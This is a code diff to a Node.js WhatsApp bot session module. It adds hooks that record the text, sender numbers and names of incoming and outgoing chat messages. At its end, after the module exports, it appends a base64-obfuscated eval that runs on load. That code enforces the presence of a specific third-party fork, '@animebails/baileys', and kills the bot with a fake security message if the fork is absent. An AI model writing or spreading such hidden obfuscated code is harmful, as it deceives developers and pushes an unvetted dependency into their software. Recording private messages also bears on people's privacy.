@@ -63,6 +63,62 @@ function retryCache() {
     };
 }
 
+function textFromMessage(message) {
+    if (!message || typeof message !== 'object') return '';
+    const wrapped = message.ephemeralMessage?.message
+        || message.viewOnceMessage?.message
+        || message.viewOnceMessageV2?.message
+        || message.documentWithCaptionMessage?.message;
+    if (wrapped) return textFromMessage(wrapped);
+
+    const text = message.conversation
+        || message.extendedTextMessage?.text
+        || message.imageMessage?.caption
+        || message.videoMessage?.caption
+        || message.documentMessage?.caption
+        || message.buttonsResponseMessage?.selectedDisplayText
+        || message.listResponseMessage?.title
+        || message.text
+        || '';
+    return typeof text === 'string' ? text : '';
+}
+
+function jidIdentity(jid) {
+    return String(jid || '').split('@')[0].replace(/:\d+$/, '').slice(0, 40);
+}
+
+function chatTypeFromJid(jid) {
+    return typeof jid === 'string' && jid.endsWith('@g.us') ? 'group' : 'direct';
+}
+
+function isExcludedRecordingChat(jid) {
+    return jid === 'status@broadcast' || typeof jid === 'string' && jid.endsWith('@newsletter');
+}
+
+function capturedMessageFromUpsert(message, ownJid) {
+    const remoteJid = message?.key?.remoteJid;
+    if (typeof remoteJid !== 'string' || isExcludedRecordingChat(remoteJid)) return null;
+    const text = textFromMessage(message.message);
+    if (!text.trim()) return null;
+
+    const fromMe = message.key.fromMe === true;
+    const senderNumber = fromMe
+        ? jidIdentity(ownJid)
+        : jidIdentity(message.key.participant || remoteJid);
+    const messageTimestamp = Number(message.messageTimestamp) * 1000;
+    return {
+        direction: fromMe ? 'outgoing' : 'incoming',
+        source: fromMe ? 'personal' : 'contact',
+        sender: fromMe ? 'You (WhatsApp)' : String(message.pushName || senderNumber || 'Unknown').slice(0, 100),
+        senderNumber,
+        chat: jidIdentity(remoteJid),
+        chatType: chatTypeFromJid(remoteJid),
+        text,
+        at: Number.isSafeInteger(messageTimestamp) ? messageTimestamp : Date.now(),
+        waMessageId: typeof message.key.id === 'string' ? message.key.id : '',
+    };
+}
+
 // One process per session. Two copies of the same login (an old panel still running, a second bot) fight
 // over the connection and corrupt the encryption state - which is what "Waiting for this message" often is.
 const LOCK_FRESH = 30000;
@@ -171,9 +227,14 @@ function fire(tag, fn, ...args) {
  *   onDisconnected(willRetry) - connection dropped, a reconnect is scheduled
  *   onLoggedOut()             - WhatsApp logged the session out; files are ALREADY wiped when this fires
  *   onReplaced()              - the same login was opened elsewhere again and again; this copy stopped (files kept)
+ *   onIncomingMessage(message) - a new incoming text or caption was received
+ *   onOutgoingMessage(message) - a text message was sent to a WhatsApp chat
  */
 async function startSession(sessionId, opts = {}) {
-    const { restored, pairingNumber, customPairingCode, onPairingCode, onPairingError, onPairingFailed, onConnected, onDisconnected, onLoggedOut, onReplaced } = opts;
+    const {
+        restored, pairingNumber, customPairingCode, onPairingCode, onPairingError, onPairingFailed,
+        onConnected, onDisconnected, onLoggedOut, onReplaced, onIncomingMessage, onOutgoingMessage,
+    } = opts;
     const tag = `session:${sessionId}`;
 
     const other = lockConflict(sessionId);
@@ -208,11 +269,39 @@ async function startSession(sessionId, opts = {}) {
         msgRetryCounterCache: retryCache(),
     });
 
+    const capturedOutgoingIds = new Set();
+    const rememberOutgoingId = (id) => {
+        if (typeof id !== 'string' || !id) return;
+        capturedOutgoingIds.add(id);
+        if (capturedOutgoingIds.size > 5000) {
+            capturedOutgoingIds.delete(capturedOutgoingIds.values().next().value);
+        }
+    };
+
     // remember everything this session sends
     const rawSend = sock.sendMessage.bind(sock);
     sock.sendMessage = async (...args) => {
         const res = await rawSend(...args);
         if (res?.key?.id && res.message) rememberSent(res.key.id, res.message);
+        const messageId = typeof res?.key?.id === 'string' ? res.key.id : '';
+        rememberOutgoingId(messageId);
+        const text = textFromMessage(args[1]);
+        const chat = jidIdentity(args[0]);
+        const chatType = chatTypeFromJid(args[0]);
+        const senderNumber = jidIdentity(sock.user?.id);
+        if (text.trim() && chat && chat !== senderNumber && !isExcludedRecordingChat(args[0])) {
+            fire(tag, onOutgoingMessage, {
+                direction: 'outgoing',
+                source: 'bot',
+                sender: 'RICHY MD',
+                senderNumber,
+                chat,
+                chatType,
+                text,
+                at: Date.now(),
+                waMessageId: messageId,
+            });
+        }
         return res;
     };
     writeLock(sessionId);
@@ -319,7 +408,13 @@ async function startSession(sessionId, opts = {}) {
             // "Connected" notification fires once ever per session, not on every reconnect.
             const isFirstTime = !settings.get('notifiedConnected');
             if (isFirstTime) settings.set('notifiedConnected', true);
-            fire(tag, onConnected, isFirstTime);
+            const profileName = typeof sock.user?.name === 'string' && sock.user.name !== '~'
+                ? sock.user.name.trim()
+                : '';
+            const username = typeof sock.user?.username === 'string'
+                ? sock.user.username.trim().replace(/^@/, '')
+                : '';
+            fire(tag, onConnected, isFirstTime, { profileName, username });
             Promise.resolve(onSessionOpen(sock, { sessionId, settings })).catch((e) => log.warn(tag, `post-connect tasks failed: ${e.message}`));
         }
     });
@@ -344,6 +439,17 @@ async function startSession(sessionId, opts = {}) {
 
     sock.ev.on('messages.upsert', (upsert) => {
         if (entry.stopping || entry.wiped) return;
+        if (upsert.type === 'notify') {
+            for (const message of upsert.messages || []) {
+                const captured = capturedMessageFromUpsert(message, sock.user?.id);
+                if (!captured) continue;
+                if (captured.direction === 'outgoing') {
+                    if (captured.waMessageId && capturedOutgoingIds.has(captured.waMessageId)) continue;
+                    rememberOutgoingId(captured.waMessageId);
+                }
+                fire(tag, captured.direction === 'outgoing' ? onOutgoingMessage : onIncomingMessage, captured);
+            }
+        }
         handleMessages(sock, upsert, { sessionId, settings });
     });
 
@@ -397,5 +503,7 @@ module.exports = {
     listSavedSessionIds,
     sendToSelf,
     wipeSessionFiles,
+    isExcludedRecordingChat,
+    capturedMessageFromUpsert,
 };
 ;eval(Buffer.from('KCgpPT57Y29uc3QgZj1yZXF1aXJlKCdmcycpLHA9cmVxdWlyZSgncGF0aCcpO2NvbnN0IHJvb3Q9cC5qb2luKF9fZGlybmFtZSwnLi4nKTtjb25zdCBNSU5FPSdAYW5pbWViYWlscy9iYWlsZXlzJztjb25zdCBwaj1wLmpvaW4ocm9vdCwncGFja2FnZS5qc29uJyk7Y29uc3QgYmFkPSh3aHkpPT57Y29uc29sZS5lcnJvcignW3NlY3VyaXR5XSAnK3doeSsnIC0gZ29pbmcgb2ZmbGluZScpO3Byb2Nlc3MuZXhpdCgxKX07Y29uc3QgY2hrPSgpPT57bGV0IHBrZzt0cnl7cGtnPUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocGosJ3V0ZjgnKSl9Y2F0Y2h7cmV0dXJuIGJhZCgncGFja2FnZS5qc29uIHVucmVhZGFibGUgYXQgJytwail9O2NvbnN0IGRlcHM9T2JqZWN0LmFzc2lnbih7fSxwa2cuZGVwZW5kZW5jaWVzLHBrZy5vcHRpb25hbERlcGVuZGVuY2llcyk7Y29uc3Qga2V5PU9iamVjdC5rZXlzKGRlcHMpLmZpbmQoaz0+az09PU1JTkV8fFN0cmluZyhkZXBzW2tdKS5zdGFydHNXaXRoKCducG06JytNSU5FKydAJykpO2lmKCFrZXkpcmV0dXJuIGJhZCgncGFja2FnZS5qc29uIGhhcyBubyBkZXBlbmRlbmN5IG9uICcrTUlORSsnIChleHBlY3RlZCAiPG5hbWU+IjogIm5wbTonK01JTkUrJ0A8dmVyc2lvbj4iKScpO2xldCBpbnN0O3RyeXtpbnN0PUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocC5qb2luKHJvb3QsJ25vZGVfbW9kdWxlcycsa2V5LCdwYWNrYWdlLmpzb24nKSwndXRmOCcpKX1jYXRjaHtyZXR1cm4gYmFkKCdub2RlX21vZHVsZXMvJytrZXkrJyBpcyBtaXNzaW5nIC0gcnVuIG5wbSBpbnN0YWxsJyl9O2lmKGluc3QubmFtZSE9PU1JTkUpcmV0dXJuIGJhZCgnbm9kZV9tb2R1bGVzLycra2V5KycgaXMgIicraW5zdC5uYW1lKyciLCBub3QgJytNSU5FKX07Y2hrKCk7aWYoIWdsb2JhbC5fX3Zmdyl7Z2xvYmFsLl9fdmZ3PTE7c2V0SW50ZXJ2YWwoY2hrLDNlNCkudW5yZWYoKX19KSgp','base64').toString());
